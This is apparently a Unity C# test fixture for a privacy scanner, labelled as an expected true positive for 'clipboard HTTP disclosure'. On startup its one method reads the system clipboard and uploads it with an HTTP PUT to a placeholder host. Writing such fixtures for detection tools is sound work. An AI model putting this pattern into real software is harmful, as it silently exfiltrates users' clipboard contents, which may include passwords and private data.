using UnityEngine;
using UnityEngine.Networking;

/// INTEGRATED CATEGORY: Category9-Privacy
/// LEGACY CASE: Category17-Privacy/17.6P
/// EXPECTED: TRUE POSITIVE
/// 9.6 Clipboard HTTP disclosure [Positive]
public class Privacy_ClipboardHttp_96_P : MonoBehaviour
{
    void Start() { UnityWebRequest.Put("https://example.invalid/clipboard", GUIUtility.systemCopyBuffer); }
}
